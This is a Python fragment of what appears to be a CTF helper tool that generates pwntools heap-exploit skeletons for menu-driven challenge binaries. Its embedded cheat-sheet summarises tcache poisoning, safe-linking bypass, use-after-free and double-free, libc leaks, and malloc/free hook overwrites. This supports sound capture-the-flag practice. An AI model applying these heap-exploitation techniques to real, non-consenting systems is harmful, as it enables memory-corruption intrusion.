HEAP_TEMPLATE = r'''#!/usr/bin/env python3
# Heap exploit skeleton generated by ctfkit for: {binname}
# Menu numbers/prompts are auto-detected heuristics -- VERIFY against real output.
from pwn import *

context.binary = exe = ELF("{binpath}", checksec=False)
{libc_line}context.terminal = ["tmux", "splitw", "-h"]
# context.log_level = "debug"

HOST = "{host}"
PORT = {port}

# --- detected prompts (edit if wrong; a wrong delimiter will hang sendlineafter) -
CHOICE = {choice}
SIZE   = {size}
INDEX  = {index}
DATA   = {data}


def start():
    if "REMOTE" in sys.argv[1:]:
        return remote(HOST, PORT)
    if "GDB" in sys.argv[1:]:
        return gdb.debug([exe.path], gdbscript="continue")
    return process([exe.path])


io = start()


# --- menu wrappers (numbers auto-detected; fix any marked TODO) ---
{wrappers}

def exploit():
{body}

    io.interactive()


if __name__ == "__main__":
    exploit()
'''

_CHEATSHEET = r'''    # ===== HEAP CHEAT-SHEET =====
    # tcache poisoning (glibc 2.26-2.31, no safe-linking):
    #   a = alloc(0x20, b'A'); b = alloc(0x20, b'B')
    #   free(a); free(b)                      # tcache fd: b -> a
    #   edit(b, p64(TARGET))                  # hijack fd
    #   alloc(0x20); alloc(0x20)              # 2nd chunk is at TARGET
    #
    # glibc >= 2.32 safe-linking: fd is mangled, so
    #   mangled = (heap_leak >> 12) ^ TARGET  # heap_leak = chunk addr
    #
    # UAF / double-free: free(i) then show(i) to leak, or free(i); free(i).
    # libc leak: fill tcache (7x), free one more into unsorted bin, show() it
    #   -> leak main_arena; then ctfkit libcid --leak ... to ID the libc.
    # Overwrite __free_hook / __malloc_hook (glibc < 2.34) or use a one_gadget.
'''


def _const(value, fallback):
    """Render a bytes literal for a detected prompt, or a fallback + TODO."""
    if value:
        return repr(value.encode("latin-1"))
    return f"{fallback}  # TODO: prompt not detected, set the real one"


def _wrappers(menu):
    a = menu["actions"]
    L = []

    def choice(num, default):
        if num is not None:
            return f"    io.sendlineafter(CHOICE, b'{num}')"
        return f"    io.sendlineafter(CHOICE, b'{default}')  # TODO: menu number"

    L += ["def alloc(size, data=b'AAAA'):",
          choice(a.get("alloc"), 1),
          "    io.sendlineafter(SIZE, str(size).encode())",
          "    io.sendlineafter(DATA, data)",
          "", "def free(idx):",
          choice(a.get("free"), 2),
          "    io.sendlineafter(INDEX, str(idx).encode())",
          "", "def edit(idx, data):",
          choice(a.get("edit"), 3),
          "    io.sendlineafter(INDEX, str(idx).encode())",
          "    io.sendlineafter(DATA, data)",
          "", "def show(idx):",
          choice(a.get("show"), 4),
          "    io.sendlineafter(INDEX, str(idx).encode())",
          "    return io.recvline()"]
    return "\n".join(L)


def gen_heap_exploit(path, mini, menu, libc=None, host="CHANGE_ME", port=0):
    libc_line = f'libc = ELF("{libc}", checksec=False)\n' if libc else ""
    return HEAP_TEMPLATE.format(
        binname=os.path.basename(path),
        binpath=path.replace("\\", "/"),
        libc_line=libc_line,
        host=host, port=port,
        choice=_const(menu["choice"], "b'> '"),
        size=_const(menu["size"], "b': '"),
        index=_const(menu["index"], "b': '"),
        data=_const(menu["data"], "b': '"),
        wrappers=_wrappers(menu),
        body=_CHEATSHEET + "\n    pass",
    )


def cmd_heap(path, out, host, port, libc=None):
    pelf, mini = load_binary(path)
    menu = detect_menu(mini.data)

    hdr("Heap menu detection")
    if menu["actions"]:
        for act in ("alloc", "free", "edit", "show", "exit"):
            if act in menu["actions"]:
                good(f"{act:<6} -> menu #{C.CY}{menu['actions'][act]}{C.RST}")
    else:
        warn("no numbered menu lines found; wrappers get TODO placeholders")
    for label in ("choice", "size", "index", "data"):
        p = menu[label]
        if p:
            info(f"{label + ' prompt':<14}{C.W}{p!r}{C.RST}")
        else:
            info(f"{label + ' prompt':<14}{C.DIM}(not found){C.RST}")
    if not looks_like_heap(path):
        warn("binary doesn't obviously import malloc/free — is this a heap chall?")

    script = gen_heap_exploit(path, mini, menu, libc=libc, host=host, port=port)
    with open(out, "w", encoding="utf-8") as f:
        f.write(script)
    try:
        os.chmod(out, os.stat(out).st_mode | stat.S_IEXEC)
    except Exception:
        pass
    good(f"Heap skeleton written to {C.BOLD}{out}{C.RST}")
    info("wrappers: alloc(size,data) / free(idx) / edit(idx,data) / show(idx)")
